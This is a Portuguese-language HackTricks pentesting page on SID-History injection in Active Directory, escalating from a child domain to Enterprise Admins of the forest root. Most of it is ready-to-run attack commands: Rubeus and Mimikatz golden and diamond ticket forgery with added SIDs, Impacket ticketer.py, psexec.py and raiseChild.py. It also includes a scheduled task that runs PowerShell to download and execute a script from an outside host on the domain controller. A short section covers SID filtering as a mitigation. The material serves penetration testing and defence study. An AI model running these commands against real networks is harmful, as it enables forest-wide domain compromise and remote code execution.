# SID-History Injection

{{#include ../../banners/hacktricks-training.md}}

## SID History Injection Attack

O foco do **SID History Injection Attack** é auxiliar a **migração de usuários entre domínios**, garantindo ao mesmo tempo o acesso contínuo aos recursos do domínio anterior. Isso é feito **incorporando o Security Identifier (SID) anterior do usuário ao SID History** da nova conta. Notavelmente, esse processo pode ser manipulado para conceder acesso não autorizado, adicionando o SID de um grupo com privilégios elevados (como Enterprise Admins ou Domain Admins) do domínio pai ao SID History. Essa exploração concede acesso a todos os recursos dentro do domínio pai.<sup>[[1]](#references)[[2]](#references)</sup>

Existem dois métodos para executar esse ataque: por meio da criação de um **Golden Ticket** ou de um **Diamond Ticket**.

Para identificar o SID do grupo **"Enterprise Admins"**, primeiro é necessário localizar o SID do domínio raiz. Após identificá-lo, o SID do grupo Enterprise Admins pode ser construído anexando `-519` ao SID do domínio raiz. Por exemplo, se o SID do domínio raiz for `S-1-5-21-280534878-1496970234-700767426`, o SID resultante para o grupo "Enterprise Admins" será `S-1-5-21-280534878-1496970234-700767426-519`.<sup>[[1]](#references)</sup>

Você também pode usar os grupos **Domain Admins**, cujo SID termina em **512**.

Outra maneira de encontrar o SID de um grupo do outro domínio (por exemplo, "Domain Admins") é com:
```bash
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
> [!WARNING]
> Observe que é possível desabilitar o SID history em uma relação de confiança, o que fará este ataque falhar.

De acordo com a [**documentação**](https://technet.microsoft.com/library/cc835085.aspx):<sup>[[3]](#references)</sup>
- **Desabilitar o SIDHistory em forest trusts** usando a ferramenta netdom (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
- **Aplicar o SID Filter Quarantining a external trusts** usando a ferramenta netdom (`netdom trust /domain: /quarantine:yes on the domain controller`)
- **Aplicar o SID Filtering a domain trusts dentro de uma única forest** não é recomendado, pois é uma configuração sem suporte e pode causar alterações incompatíveis. Se um domínio dentro de uma forest não for confiável, ele não deverá ser membro da forest. Nesse caso, é necessário primeiro separar os domínios confiáveis e não confiáveis em forests distintas, onde o SID Filtering poderá ser aplicado a um interforest trust

Confira este post para obter mais informações sobre como realizar bypass disso: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)

### Diamond Ticket (Rubeus + KRBTGT-AES256)

Na última vez que tentei isso, precisei adicionar o argumento **`/ldap`**.
```bash
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap

# Or a ptt with a golden ticket
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

#e.g.

execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd

# You can use "Administrator" as username or any other string
```
### Golden Ticket (Mimikatz) com KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
Para mais informações sobre Golden Tickets, consulte:


{{#ref}}
golden-ticket.md
{{#endref}}


Para mais informações sobre Diamond Tickets, consulte:


{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
Escale para DA do domínio raiz ou Enterprise admin usando o hash KRBTGT do domínio comprometido:
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
Com as permissões adquiridas no ataque, você pode executar, por exemplo, um ataque DCSync no novo domínio:


{{#ref}}
dcsync.md
{{#endref}}

### A partir do Linux

#### Manualmente com [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### Automaticamente usando [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

Este é um script do Impacket que **automatiza a escalada do domínio filho para o domínio pai**. O script precisa de:

- Controlador de domínio alvo
- Credenciais de um usuário administrador no domínio filho

O fluxo é:

- Obtém o SID do grupo Enterprise Admins do domínio pai
- Recupera o hash da conta KRBTGT no domínio filho
- Cria um Golden Ticket
- Faz login no domínio pai
- Recupera as credenciais da conta Administrator no domínio pai
- Se o switch `target-exec` for especificado, autentica-se no Domain Controller do domínio pai via Psexec.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## Referências

- [1] [Sneaky Active Directory Persistence #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
- [2] [What is Security Identifier (SID)? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
- [3] [Security Considerations for Trusts - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)

{{#include ../../banners/hacktricks-training.md}}
